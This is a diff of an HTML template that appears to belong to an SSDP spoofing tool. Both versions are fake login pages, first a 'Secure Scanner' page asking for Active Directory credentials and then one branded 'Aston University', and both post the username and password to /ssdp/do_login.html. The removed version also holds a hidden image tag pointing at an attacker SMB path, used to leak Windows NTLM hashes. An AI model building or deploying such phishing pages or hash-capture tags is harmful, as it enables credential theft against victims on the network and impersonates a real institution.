@@ -1,138 +1,88 @@
 <!DOCTYPE html>
-<style>
-@import url(http://fonts.googleapis.com/css?family=Open+Sans:300,400,700);
-
-*{margin:0;padding:0;}
-
-body{
-  background:#567;
-  font-family:'Open Sans',sans-serif;
-}
-
-.button{
-  width:100px;
-  background:#3399cc;
-  display:block;
-  margin:0 auto;
-  margin-top:1%;
-  padding:10px;
-  text-align:center;
-  text-decoration:none;
-  color:#fff;
-  cursor:pointer;
-  transition:background .3s;
-  -webkit-transition:background .3s;
-}
-
-.button:hover{
-  background:#2288bb;
-}
-
-#login{
-  width:400px;
-  margin:0 auto;
-  margin-top:8px;
-  margin-bottom:2%;
-  transition:opacity 1s;
-  -webkit-transition:opacity 1s;
-}
-
-#triangle{
-  width:0;
-  border-top:12x solid transparent;
-  border-right:12px solid transparent;
-  border-bottom:12px solid #3399cc;
-  border-left:12px solid transparent;
-  margin:0 auto;
-}
-
-#login h1{
-  background:#3399cc;
-  font-size:240%;
-  font-weight:500;
-  text-align:center;
-  color:#fff;
-}
-
-#login h2{
-  background:#3399cc;
-  font-size:140%;
-  font-weight:300;
-  text-align:center;
-  color:#fff;
-}
-
-#login h3{
-  background:#3399cc;
-  padding:20px;
-  font-size:75%;
-  font-weight:100;
-  text-align:center;
-  color:#fff;
-}
-
-form{
-  background:#f0f0f0;
-  padding:6% 4%;
-}
-
-input[type="username"],input[type="password"]{
-  width:92%;
-  background:#fff;
-  margin-bottom:4%;
-  border:1px solid #ccc;
-  padding:4%;
-  font-family:'Open Sans',sans-serif;
-  font-size:95%;
-  color:#555;
-}
-
-input[type="submit"]{
-  width:100%;
-  background:#3399cc;
-  border:0;
-  padding:4%;
-  font-family:'Open Sans',sans-serif;
-  font-size:100%;
-  color:#fff;
-  cursor:pointer;
-  transition:background .3s;
-  -webkit-transition:background .3s;
-}
-
-input[type="submit"]:hover{
-  background:#2288bb;
-}
-</style>
-
 <html>
-
 <head>
+    <title>SSDP Spoofer Control</title>
+    <style>
+      body {
+          margin: 0;
+          padding: 0;
+          background-color: #000; /* Black background */
+          font-family: 'Open Sans', sans-serif;
+          height: 100vh;
+          display: flex;
+          flex-direction: column; /* Stack elements vertically */
+          justify-content: center;
+          align-items: center;
+          text-align: center;
+      }
+      
+      .circle {
+          width: 200px; /* Width of the circle */
+          height: 200px; /* Height of the circle */
+          background-color: #800080; /* Purple background */
+          border-radius: 50%; /* Makes it round */
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          color: white; /* Text color */
+          font-size: 24px; /* Text size */
+          margin-bottom: 30px; /* Adds space below the circle */
+      }
+      
+      #login {
+          width: 300px; /* Set a fixed width for the form */
+      }
 
-  <meta charset="UTF-8">
+      #login input[type="username"], #login input[type="password"] {
+          width: 100%;
+          padding: 10px; /* Reduced padding */
+          margin-bottom: 10px; /* Space between fields */
+          background: #fff; /* White background */
+          border: 1px solid #ccc; /* Default border color */
+          border-radius: 15px; /* Rounded corners */
+          box-sizing: border-box; /* Include padding and border in the element's total width and height */
+      }
 
-  <title>Secure Scanner - Login</title>
+      #login input[type="username"]:focus, #login input[type="password"]:focus {
+          outline: none; /* Remove the default focus outline */
+          border-color: #800080; /* Purple border for focus */
+      }
 
+      #login input[type="submit"] {
+          width: 100%;
+          padding: 10px; /* Reduced padding */
+          background: #000; /* Button background black */
+          border: 2px solid #fff; /* White border */
+          border-radius: 15px; /* Rounded corners */
+          color: #fff; /* Text color white */
+          cursor: pointer;
+          transition: background-color .3s, color .3s; /* Transition for smooth color change */
+      }
+
+      #login input[type="submit"]:hover {
+          background: #fff; /* Background white */
+          color: #000; /* Text color black */
+      }
+
+      .button {
+          background: none;
+          border: none;
+          color: #3399cc;
+          text-decoration: underline;
+          cursor: pointer;
+          margin-top: 15px; /* Space from the sign-in button */
+      }
+  </style>
 </head>
-
-
-
 <body>
-
-<div id="login">
-  <div id="triangle"></div>
-  <h1>Log in</h1>
-  <h2>You have [3] scans waiting</h2>
-  <h3>Please enter your Active Directory username and password</h3>
-  <form method="POST" action="/ssdp/do_login.html" name="LoginForm">
-    <input type="username" name="username" placeholder="Username" />
-    <input type="password" name="password" placeholder="Password" />
-    <input type="submit" value="Log in" />
-  </form>
-</div>
-
-
-
+  <div class="circle">Aston University</div>
+  <div id="login">
+      <form method="POST" action="/ssdp/do_login.html">
+          <input type="username" name="username" placeholder="Username" />
+          <input type="password" name="password" placeholder="Password" />
+          <input type="submit" value="Sign In" />
+      </form>
+      <button class="button">Forgot Password?</button>
+  </div>
 </body>
-<img src="file://///$smb_server/smb/hash.jpg" style="display: none;" /><br>
 </html>
